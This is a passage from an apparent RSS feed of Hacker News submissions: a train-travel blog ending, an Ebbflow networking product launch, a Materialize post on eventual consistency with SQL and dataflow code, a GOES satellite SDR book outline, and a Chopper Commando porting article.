<p>Unsurprisingly, you’re likely to wake up groggy and grumpy.&nbsp; If you’re at your destination already, you’ll be decanted onto the streets and condemned to wander until your hotel opens; if not, you’ll probably catch up by napping in your bunk during the day, throwing your sleep cycle even more out of whack.</p>
<h2>So why do it?</h2>
<p>Well, that was quite the litany of whinging, why would anybody voluntarily subject themselves to this then?</p>
<p>It’s <strong>an opportunity to idle</strong>.&nbsp; There is way more time than there are things to do, so you can read a book, play cards, study the <a href="https://driftingclouds.net/2018/02/20/that-is-not-your-name-the-kafkaesque-world-of-russian-duolingo/">finer points of Russian grammar</a> on Duolingo, or just take a nap — and all the earlier kvetching aside, your train bunk is still more spacious and comfy than even a business class seat on an airplane.</p>
<p>Traveling by train, you get a <strong>sense of distance</strong>.&nbsp; I flew Beijing to Irkutsk in 2.5 hours, and saw basically nothing even from the window seat.&nbsp; Traveling the same route by train took 54 hours, and while I still can’t say I <em>really&nbsp;</em>know what it felt like to <a href="https://www.goodreads.com/book/show/17286667-on-the-trail-of-genghis-khan">cross the Gobi by camel</a>, now at least I have some reference point for the sheer scale of the feat.</p>
<div data-original-width="636" data-carousel-extra="{&quot;blog_id&quot;:40678465,&quot;permalink&quot;:&quot;https:\/\/driftingclouds.net\/2018\/07\/04\/from-siberia-to-tibet-life-on-a-train\/&quot;,&quot;likes_blog_id&quot;:40678465}" itemscope="" itemtype="http://schema.org/ImageGallery"> <div data-original-width="636" data-original-height="294"> <div data-original-width="441" data-original-height="294"> <div itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"> <a href="https://driftingcloudsnet.files.wordpress.com/2018/08/dsc_5645.jpg" itemprop="url"> <meta itemprop="width" content="437"> <meta itemprop="height" content="290"> <img data-attachment-id="517" data-orig-file="https://driftingcloudsnet.files.wordpress.com/2018/08/dsc_5645.jpg" data-orig-size="4928,3264" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D7000&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1530730133&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;18&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.004&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dsc_5645" data-image-description="" data-medium-file="https://driftingcloudsnet.files.wordpress.com/2018/08/dsc_5645.jpg?w=300" data-large-file="https://driftingcloudsnet.files.wordpress.com/2018/08/dsc_5645.jpg?w=636" src="https://driftingcloudsnet.files.wordpress.com/2018/08/dsc_5645.jpg?w=437&amp;h=290" width="437" height="290" data-original-width="437" data-original-height="290" itemprop="http://schema.org/image" title="dsc_5645" alt="dsc_5645"> </a> </div> </div> <!-- close group -->  <!-- close group --> </div> <!-- close row -->  <!-- close row --> </div>
<p>But above all, <strong>you see a slice of real life</strong>.&nbsp; It’s not always pretty (any train traveler in India will have a hard time unseeing the spectacle of the track sides being used as a public lavatory), but simply put, without taking the train you wouldn’t see ramshackle Siberian dachas, rusting factories around Ulan-Ude, yurt cities around Ulan Bator, ghastly commieblocks around a Mongolian military base in the Gobi desert, Chinese factories spewing grey smoke into the skies of Inner Mongolia, the green hills of Shaanxi, the shaggy yaks wandering around the plateaus of Tibet, the massive scale of construction around Lhasa and more.&nbsp; This trip wouldn’t have been the same at all without it, and I have zero regrets.</p>
<p>On to Mongolia!</p>
<p><strong><a href="https://driftingclouds.net/2018/07/02/from-siberia-to-tibet-irkutsk-lake-baikal/">&lt;&lt;&lt; Irkutsk &amp; Lake Baikal</a>&nbsp;|&nbsp;<a href="https://driftingclouds.net/2018/07/07/from-siberia-to-tibet-ulaanbaatar-gorkhi-terelj-and-the-gobi-desert/">Ulaanbaatar, Gorkhi-Terelj and the Gobi Desert &gt;&gt;&gt;</a></strong></p>
			
			
								</div><!-- .entry-content -->

	
	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://driftingclouds.net/2018/07/04/from-siberia-to-tibet-life-on-a-train/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832549</guid>
            <pubDate>Tue, 14 Jul 2020 14:45:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Ebbflow – A Multi-Cloud Load Balancer and SSH Proxy. Host from Anywhere]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23832533">thread link</a>) | @gorbot
<br/>
July 14, 2020 | https://ebbflow.io/blog/announce | <a href="https://web.archive.org/web/*/https://ebbflow.io/blog/announce">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>After almost a year of hard work, Ebbflow has launched! It has been an invaluable learning experience and I'm super excited to get this tool into the hands of other developers.</p>
    <p>Ebbflow is multi-cloud load balancer and SSH proxy service. You can use it to host websites (or generic TLS endpoints!) privately and securely with browser-trusted certificates which can be automatically provisioned and presented for you. Connect to your servers from anywhere, no matter where they are or what network they are in. In a word, Ebbflow is flexible.
    </p><h3>Why Ebbflow?</h3>
    <p>Networking is a pain. Configuring firewalls, DNS, EC2 security groups, port-forwarding, etc., is complicated and difficult. It can be extremely specific. And most importantly, it is inflexible. Let's look at an example: home hosting. If I asked you to host a website from your home computer/raspberry pi, with a browser-trusted certificate, how would you do that? How durable is it? How much manual configuration does it involve? The easiest solution I can think of involves port-forwarding your home router to a server of yours and routing your DNS name to your home's IP address. Is that private? What if your IP changes? Sounds fun. Don't get a new router! Or move!</p>
    <p>Enterprise web hosting can be little easier - all cloud providers have load balancers you can use to route traffic to your servers in a local network, typically in a single region. This will work for many people, but things get hard once you'd like to move outside this standard model. If you are familiar with cloud networking, consider the difficulty of the following situations: migrating from on-premises to cloud, cloud-cloud migration, being multi-region or global, routing to a Kubernetes cluster and handling updates, migrating from instances to containers, handling AZ failover, or region failover. A lot of these problems do have solutions - you <i>can</i> solve these problems and some are easier than others - but the solutions are vendor specific, disjoint, application specific, and typically inflexible.</p>
    <p>Ebbflow provides a single and global networking model that doesn't just solve a few of these problems, it solves all of these problems.</p>
    <h3>The Ebbflow Model</h3>
   <p><u>In short</u>: All things connect to Ebbflow. Ebbflow routes clients to servers, privately and securely.</p>
   <p><img src="https://ebbflow.io/resources/smallnarrow.png" width="100px"></p><p>Ebbflow flips the paradigm you are currently used to. With Ebbflow, your servers reach up and await connections. Ebbflow has the fun task of routing clients to your servers. When a client visits your website or endpoint, Ebbflow picks the nearest server and proxies the connection through the <a href="https://ebbflow.io/documentation#client" target="_blank">client</a> to your server process or local SSH daemon.</p>
    <p>This new way of modeling your network removes many of the roadblocks and bumps that the current world of networking has. Ebbflow allows for some interesting properties to be achieved:</p>
    <p><small>
    <ul>
       <li><strong>Firewall Friendly</strong> - Feel free to block all inbound connections to your servers yet still host your endpoint and be SSH-ed to.</li>
       <li><strong>Global &amp; Local</strong> - Ebbflow has one single interface for all customers and uses nearest-server routing to keep your traffic local for low latencies.</li>
       <li><strong>Multi Cloud</strong> - Ebbflow is deployed to AWS and Google Cloud, and is multi-region in both clouds. If a region Ebbflow is deployed to goes down, your clients <i>and servers</i> will both be routed to other regions or clouds. You don't need to account for region-failure when considering your server scaling, as your servers are always hittable.</li>
       <li><strong><a href="https://ebbflow.io/documentation#client" target="_blank">Linux, MacOS, Windows, Pi</a></strong> - Host where you want with what OS you want. Ebbflow is also ready to adopt new distros and targets to fit your needs</li>
       <li><strong>Centralized Certificate Management</strong> - Ebbflow manages and presents a browser-trusted <a href="https://letsencrypt.org/" target="_blank">Let's Encrypt</a> certificate to the visitors of your endpoint</li>
       <li><strong>LAN Agnostic</strong> - Ebbflow does not care what private network your servers are in and they can be completely isolated.</li>
       <li><strong>No Network, No Problem</strong> - Let's say you have a Raspberry Pi in the field collecting data over a cellular connection, this pi could host an endpoint, or be SSH-ed to with Ebbflow.</li>
       </ul>
       </small></p><p>This new networking model solves the above problems in a convenient and simple way. You can load balance across any network at any time. You can move the same instance between networks and without any configuration at all, the instance will continue to host your endpoint or be SSH-ed to. Multi cloud? Sure. Home hosting? Cool. Host from your Pi? Sweet!</p>
   <h3>Living in an Ebbflow World</h3>
   <p>Ebbflow takes many of the problems of modern networking off your play. Ebbflow use of technologies like nearest-host routing, global availability, and multi-cloud durability, all Ebbflow customers benefit from this as well. It's also low-investment in time and money to start hosting or connecting your servers. </p>
   <p>Prototyping and testing with Ebbflow takes <a href="https://ebbflow.io/quickstart#endpointguide" target="_blank">only a few minutes</a>. During the development of Ebbflow, I used Ebbflow many times to host endpoints or for SSH connectivity. One interesting case was that I was in a coffee shop using the SSH proxy feature to connect to my dev-box at home, while trying to fix a bug in the SSH proxy feature which caused occasional disconnects (now fixed). Ebbflow uses Ebbflow for its website and its linux package server - this request was served by <code id="hostname">raspberrypi-1-useast</code>. Also Ebbflow uses Ebbflow to host its staging environment and testing stack. It is simpler and easier to configure than other load balancing solutions and provides so many features that others lack.</p>
   <p>I'm excited to see how people use Ebbflow to solve interesting problems. We want to hear about the ways it unlocks new forms of web hosting and connectivity (just <a href="mailto:info@ebbflow.io">email us!</a>). Ebbflow provides a simple solution to complex problems and simple ones such as hosting a personal blog on your Raspberry Pi that's currently collecting dust in your junk drawer. Like I said before, Ebbflow is flexible. It will meet you at your use case and remove the complexities of networking from your problem set. See for yourself, and start testing today with the <a href="https://ebbflow.io/create_account">free trial</a>!</p>
    </div></div>]]>
            </description>
            <link>https://ebbflow.io/blog/announce</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832533</guid>
            <pubDate>Tue, 14 Jul 2020 14:43:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eventual Consistency isn’t for Streaming]]>
            </title>
            <description>
<![CDATA[
Score 162 | Comments 45 (<a href="https://news.ycombinator.com/item?id=23832149">thread link</a>) | @arjunnarayan
<br/>
July 14, 2020 | https://materialize.io/eventual-consistency-isnt-for-streaming/ | <a href="https://web.archive.org/web/*/https://materialize.io/eventual-consistency-isnt-for-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Streaming systems consume inputs and produce outputs asyncronously: the output of a system at any moment may not reflect all of the inputs seen so far. These systems provide various guarantees about how their outputs relate to their input. Among the weaker (but not unpopular) guarantees is <a href="https://en.wikipedia.org/wiki/Eventual_consistency">eventual consistency</a>. Informally, eventual consistency means if the input stops changing, the output will eventually arrive at the correct result.</p>
<p>In this post we’ll see that for as long as its input streams haven’t been stopped, natural eventually consistent computations can produce <em>unboundedly large and systematic errors</em>. If you are doing even slightly non-trivial computations, you should be prepared for your results to be <em>never-consistent</em> (a much less popular consistency definition). Until you pause the input streams and await correct answers, at least.</p>
<p>Not all is lost! There are stream processing systems that provide strong consistency guarantees. <a href="https://materialize.io/">Materialize</a> and <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a> both avoid these classes of errors by providing <em>always correct</em> answers, as do several other streaming systems.</p>
<p>If you want to avoid systematic and on-going errors in your results, you should probably check if the stream processor you use provides stronger consistency guarantees.</p>
<h2>Background on Eventual Consistency</h2>
<p>To quote from the <a href="https://en.wikipedia.org/wiki/Eventual_consistency">Wikipedia page on eventual consistency</a></p>
<blockquote><p>
  Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value.
</p></blockquote>
<p>Eventual consistency is most often invoked for key-value stores, where each key tracks an independent value and one can reasonably imagine not updating the value associated with a key for long enough that the right answer might shake out. For example, if a database stores a map from people to their addresses, your update to your own address might not be visible immediately, but if you give it a few minutes it will probably sort itself out (if you don’t further update your address).</p>
<p>The requirement is only that folks stop updating a specific key, not that they stop using the database entirely. The rest of the world can keep reading out addresses, even keep reading out your stale address, and an eventually consistent system is obliged to eventually update your address (assuming you don’t keep re-submitting updates). Eventual consistency is a workable definition of consistency for key-value stores, where the vast majority of operations do not conflict, and one can reasonably expect to wait out any inconsistency.</p>
<p>Is eventual consistency a workable definition of consistency for streaming computations?</p>
<h2>Streaming computations</h2>
<p>There are many streaming computations out there. I’m going to focus on a class that lines up well with our study of consistency: incremental view maintenance. Incremental view maintenance is where you’ve defined a view, essentially a name bound to a query, and want to see the output answers change as the input data change.</p>
<p>Let’s say you’ve defined a query that could be applied to a static dataset, something like</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>Now, the underlying <code>data</code> might change. As they do, we should produce the corresponding changes to the output. In this case, we would like to see how the <code>count</code> of the records in <code>data</code> have changed.</p>
<p>There are more complicated queries we might write. For example, this query determines the set of keys whose values are the largest among all keys:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>As <code>data</code> change, we would like to see the resulting set of keys track the maximum values</p>
<p>This next query determines the standard deviation of values for each key, and then selects out those values that are surprisingly large.</p>
<pre title="">-- determine average and stddev for groups
create view stats_by_key
select
    data.key,
    avg(data.value) as average,
    stddev(data.value) as deviation
from data
group by data.key;

-- select out surprisingly large values
select data.key, data.value
from data, stats_by_key
where
    data.key = stats_by_key.key and
    data.value &gt; average + 3 * devation
</pre>
<p>As <code>data</code> move around, the set of current outliers moves around too, and we would be delighted to be warned of them so that we can take some important action.</p>
<p>I don’t have strong opinions about whether these are exciting queries to compute, but we’ll use them as examples of streaming computations that can go surprisingly wrong. If your computations are more sophisticated than these examples, you might have even more to worry about.</p>
<h2>Eventual consistency in streaming: example 1</h2>
<p>What does a naive application of eventual consistency have to say about</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>It’s not really clear, is it? Even if there were clear keys we are writing to, the thing we want to be correct is an aggregation across all of them rather than the value associated with a specific key. That result depends on all values. We could still extrapolate the definition of eventual consistency out to mean that if the input stops changing entirely, the system will eventually update to the correct count of records in <code>data</code>.</p>
<p>Although you shouldn’t expect to see this in the wild, an eventually consistent streaming system is certainly permitted to delay its processing as long as there are any outstanding input records that haven’t been processed yet.</p>
<p>This is actually not as unreasonable as you might think. Many stream processors intentionally batch up their inputs to improve their efficiency, and get started only once they get a moment of fresh air in their input stream. This technique allows them to improve their throughput during load spikes, by batching and re-ordering updates (for example, bundling all updates to the same key). It would be natural to see updates out of order, but taken to the extreme this technique results is no updates during the load spike.</p>
<p>While this is not necessarily something you’ll see in a professional stream processor, nothing about eventual consistency prevents behavior like this. So, while it’s not the most realistic reason to be worried about eventual consistency, it paints a bit of a picture about what we might need to watch out for.</p>
<p>Let’s ignore the possibility that a technically correct eventually consistent processor could produce no results, and instead look at what happens for more reasonable systems on continually changing input streams.</p>
<h2>Eventual consistency in streaming: example 2</h2>
<p>Let’s take the query that selects out the keys with maximum values:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>This is how you express “argmax” in SQL, and it is roughly equivalent to a join between the collections <code>data</code> and <code>select max(data.value) from data</code>.</p>
<p>A reasonable person might expect to see the keys with maximum values here, and have an eventually consistent system eventually show it some maximal keys. Some head scratching and you might walk that back to “any keys at all” because they might no longer be maximal at the moment you see them. But <em>eventually</em> we should see <em>some</em> keys, right?</p>
<p>Nope.</p>
<p>At least, not as long as the input stream is allowed to change.</p>
<p>Imagine the join between <code>data</code> and <code>select max(data.value) from data</code> receives its eventually consistent inputs consistently later for <code>data</code> than for <code>select max(data.value) from data</code>. This is not unreasonable, as it can be easier to maintain a <code>max</code> than to maintain an entire collection (<code>data</code>). As each record of <code>data</code> arrives, even those records with maximal values at the time of their submission may find that the maximum has advanced before they got there. They no longer match the maximum value, and are not produced as output.</p>
<p>Let’s demonstrate this in <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a>. We’ll have to fake some things out, because its consistency guarantees are unfortunately too strong. Fortunately, we can directly program transient delays in to the dataflow.</p>
<p>Imagine a collection that may have multiple keys in it, but we’ll only need one. We’ll increment the value associated with the key regularly (perhaps this is bandwidth used, or money spent, or most recent access, or …). Importantly, we’ll delay the update along one path by the gap in time between updates.</p>
<pre title="">// Global aggregation of values, on-time.
let input1 =
data.map(|(key,val)| ((),val))
    .max_by_key() // not real; should be `reduce(...)`.
    .map(|((), val)| (val, ()));

// Delayed map from values back to their keys.
let input2 =
data.delay(|t| t + 1)
    .map(|(key,val)| (val,key));

// Observe any results
input2.semijoin(&amp;input)
      .inspect(|x| println!("KEY: {:?}", x));
</pre>
<p>We’ll feed in changes that add elements to <code>data</code>, one at a time. Roughly like so</p>
<pre title="">(key, 1000)
(key, 2000)
(key, 3000)
...
</pre>
<p>The keys and values aren’t important, other than that the maximum increases. If the maximum increases within the time of the delay associated with the “eventual” nature of the consistency, we see no results:</p>
<pre title="">    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
     Running `target/debug/examples/eventual`
Round 0 complete
Round 1 complete
Round 2 complete
Round 3 complete
Round 4 complete
Round 5 complete
...
</pre>
<p>Suffice it to say we didn’t see any <code>KEY</code> reports. We would, eventually, if we were to stall the input stream and allow one of the inputs to the join to catch up to the other.</p>
<p>What happens if we <code>delay</code> the <code>max</code> computation instead of the <code>data</code> stream? If the updates overwrite their previous values (<em>i.e.</em> if <code>(key, 2000)</code> overwrites <code>(key, 1000)</code>) then we also see no outputs, because by the time the maximum arrives the value has changed.</p>
<p>Eventual consistency is pretty badly suited to problem of aligning data, when the contents of either of those streams of data can be expected to move on. In our case, the maximum is regularly …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://materialize.io/eventual-consistency-isnt-for-streaming/">https://materialize.io/eventual-consistency-isnt-for-streaming/</a></em></p>]]>
            </description>
            <link>https://materialize.io/eventual-consistency-isnt-for-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832149</guid>
            <pubDate>Tue, 14 Jul 2020 14:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Receving GOES satellite signal with SDR]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23831423">thread link</a>) | @Xeanort
<br/>
July 14, 2020 | https://lucasteske.dev/goes-satellite-hunt/ | <a href="https://web.archive.org/web/*/https://lucasteske.dev/goes-satellite-hunt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><span>Written by</span>
    
        Lucas Teske
    

    
      <br>
      <span>on </span><time datetime="2017-02-19 00:00:00 -0300">
  19
  
  February
  2017
</time>
    
  </p>

  
  

  

<p>This book is adaptation of my blog post <a href="http://www.teske.net.br/lucas/2016/10/goes-satellite-hunt-part-1-antenna-system/">GOES Satellite Hunt</a> that was published in the end of 2016 while I was reverse engineering the satellite signal. I’m doing this book to have a more organized document about GOES-13 Signals and also to keep up to date with my GOES-16 Reverse Engineering that followed the GOES-13 Reverse Engineering. This book will also be hosted at GitHub in <a href="https://creativecommons.org/licenses/by-sa/2.5/br/">Create Commons Share Alike</a> license and any fixes are welcome from anyone. In the future I plan to add information about other satellites that use similar down link protocols like MSG-3 (Meteosat 10).</p>

<p>I also need to thank all people in #hearsat @ starchat (IRC) for the help I got understanding SDR and Satellite Signal stuff, since when I started that I had no knowledge at all about it. Special thanks for trango (<a href="https://twitter.com/usa_satcom">@usa-satcom</a>) and mybit (<a href="https://twitter.com/devnulling">@devnulling</a>) for all the help with previous experiences in the area. Also I need to thank all my family for supporting it putting several dishes and antennas all over the roof of our house.</p>

<p>The study in this book lead to the creation of <a href="https://github.com/opensatelliteproject">Open Satellite Project</a>.</p>

<p><a href="https://lucasteske.dev/goes-satellite-hunt/motivation">Next Part</a></p>



<ul>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/motivation">Motivation</a></li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-hardware-setup">The Hardware Setup</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-hardware-setup/assemble-process">Assemble Process</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-hardware-setup/dish-feed">Dish Feed</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-hardware-setup/lna-and-filter">LNA and Filter</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-hardware-setup/pointing-the-antenna">Pointing the Antenna</a></li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator">The Demodulator</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/demodulator-in-gnu-radio">Binary Phase Shift Keying Modulation</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/demodulating-bpsk-signal">Demodulating BPSK Signal</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/gnu-radio-flow">GNU Radio Flow</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/decimating-and-filtering-to-desired-sample-rate">Decimating and filtering to desired sample rate</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/automatic-gain-control-and-root-raised-cosine-filter">Automatic Gain Control and Root Raised Cosine Filter</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/synchronization-and-clock-recovery">Synchronization and Clock Recovery</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/the-demodulator/symbol-output-from-gnu-radio">Symbol Output from GNU Radio</a></li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/frame-decoder">Frame Decoder</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/frame-decoder/convolution-encoding-frame-synchronization-and-viterbi">Convolution Encoding, Frame Synchronization and Viterbi</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/frame-decoder/encoding-the-sync-word">Encoding the sync word</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/frame-decoder/frame-synchronization">Frame Synchronization</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/frame-decoder/decoding-frame-data">Decoding Frame Data</a></li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer">Packet Demuxer</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer/de-randomization-of-the-data">De-randomization of the data</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer/reed-solomon-error-correction">Reed Solomon Error Correction</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer/virtual-channel-demuxer">Virtual Channel Demuxer</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer/packet-demuxer">Packet Demuxer</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/packet-demuxer/saving-the-raw-packet">Saving the Raw Packet</a></li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-assembler">File Assembler</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-assembler/file-header-processing">File Header Processing</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-assembler/lritrice-compression">LritRice Compression</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-assembler/file-name-from-header">File Name from Header</a></li>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-assembler/viewing-the-files-content">Viewing the files content</a></li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types">File Types</a>
    <ul>
      <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description">LRIT Header Description</a>
        <ul>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/primary-header">0 - Primary Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/1-image-structure-header">1 - Image Structure Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/2-image-navigation-record">2 - Image Navigation Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/3-image-data-function-record">3 - Image Data Function Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/4-annotation-record">4 - Annotation Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/5-timestamp-record">5 - Timestamp Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/6-ancillary-text">6 - Ancillary Text</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/7-key-header">7 - Key Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/128-segment-identification-header">128 - Segment Identification Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/128-segment-identification-header">128 - Segment Identification Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/129-noaa-specific-header">129 - NOAA Specific Header</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/130-header-structured-record">130 - Header Structured Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/131-rice-compression-record">131 - Rice Compression Record</a></li>
          <li><a href="https://lucasteske.dev/goes-satellite-hunt/file-types/lrit-header-description/132-dcs-filename-record">132 - DCS Filename Record</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="https://lucasteske.dev/goes-satellite-hunt/ending">Ending</a></li>
</ul>


</div></div>]]>
            </description>
            <link>https://lucasteske.dev/goes-satellite-hunt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23831423</guid>
            <pubDate>Tue, 14 Jul 2020 13:06:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chopper Commando Revisited]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 21 (<a href="https://news.ycombinator.com/item?id=23830881">thread link</a>) | @loadzero
<br/>
July 14, 2020 | https://blog.loadzero.com/blog/chopper258/ | <a href="https://web.archive.org/web/*/https://blog.loadzero.com/blog/chopper258/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p><i>This article contains pixel art. For best results please use 100% browser zoom.</i></p>

<p><a href="https://github.com/loadzero/chopper258">chopper258</a> is a port of <a href="https://www.mobygames.com/game/chopper-commando">Chopper Commando</a>, a DOS game written by <a href="https://www.mobygames.com/developer/sheet/view/developerId,59219/">Mark Currie</a> using Turbo Pascal in 1990.</p>

<p>Some thirty years later, in 2020, I've dusted off the old code and breathed some new life into it. I've ported it to C and made it work with SDL2, and it can now run natively in modern environments.</p>

<p>The canvas below shows a minute or so of gameplay from the new version.</p>




<p>The game can also be played on the web, thanks to emscripten.</p>

<p>Let's do a quick check to see if you can play.</p>

<span>
    <p>Yes, you can play the game by <span>clicking</span> on the button below.</p>

    
    
</span>

<span>
    <p>Unfortunately, your browser looks to be incompatible. The game currently only works in Desktop Chrome, due to the use of certain low level features.</p>
</span>



<p>Thanks to Mark Currie for granting me permission to publish this translation of his game.

</p><p>In addition to publishing the <a href="https://github.com/loadzero/chopper258">source code</a>, and
<span><a href="https://blog.loadzero.com/demo/chopper258">playable version</a>,</span>
<span>playable version,</span> I am also writing a series of articles to accompany the
project, the first part of which is included below.</p>

<p>I have also made some animations and interactive parts that you can <span>play</span> around
with, such as the <a href="#picker_link">palette picker</a> later on in this piece.</p>



<h2>Background</h2>

<p>I chose to revisit Chopper Commando for a few reasons.

</p><p>One of the biggest ones is nostalgia. I remember enjoying playing this game
as a child, on my PC and with others, and being surprised at some of the novel
mechanics. I also remember having a good laugh.

</p><p>This is the first game I played where you could leave a
vehicle, run around and do things on foot, and then get back in and keep going.
I thought that was so cool, and it was an early precursor to the sandbox games I
enjoy today.

</p><p>I have a soft spot for bedroom coded efforts like this, where the heart and
soul of the game isn't obscured by many layers of polish. It's not too hard to
imagine a 15-year old Mark Currie writing a game for himself on his 286, and
getting a real kick out of doing so.

</p><p>Games like this were pretty formative for me as a young aspiring games
programmer. Unlike something like Super Mario, which seemed unreachable to me at the time, I could play this and start working out how to make something similar, even with the simple tools I had.

</p><h2>Project Scale</h2>

<p>This was a bit smaller and more straightforward than my previous effort,
<a href="http://blog.loadzero.com/blog/si78c/">Space Invaders In C</a>. This project
took around 3 months of calendar time, and about 200 hours were spent on it in total.

</p><p>As the source code to the game was available, albeit in Pascal, not much
reverse engineering was required. Most of the effort went into the translation
to C, and building new code to provide workalikes for the Turbo Pascal API.

</p><p>One of the last parts I worked on, the sound, also turned out to be one of
the most difficult. The original game used PC speaker sound in a dynamic way,
and I had to write a synthesizer for it. It was quite fiddly to get the timing
right and make it sound like the original. More on that in part two.

</p><p>The original code is around 5500 lines of Pascal, all of it game logic code.
The new C version is around 5500 lines of game logic, 1500 lines of support
code and 400 lines of comments.

</p><p>Compared to the last project, there isn't too much behind the scenes
unpublished code in this one. I wrote a few small pieces to aid translation,
some scripts to build the font data, and some prototypes to help figure out the
sound code.

</p><p>I did end up writing a little bit of pascal code, mostly as temporary mods to the
original game source to help me figure out what the original system was doing. More
detail on compiling the old code is provided in a later piece.

</p><h2>Graphics</h2>

<p>One of the very first things I did on the project was to figure out the framebuffer format
for the original game, and start hacking to get it to display on a modern system.

</p><p>The frame buffer is CGA, meaning it is 320 pixels wide, 200 lines high and has
2 bit paletted color, for a grand total of four possible colors on screen at
any one time.

</p><p>Below is a selection of screen shots from the game in all their CGA glory.</p>



<p>If you look carefully, even though each screen can only show four colors, 
you can see that there are more than four colors in total. This is due to
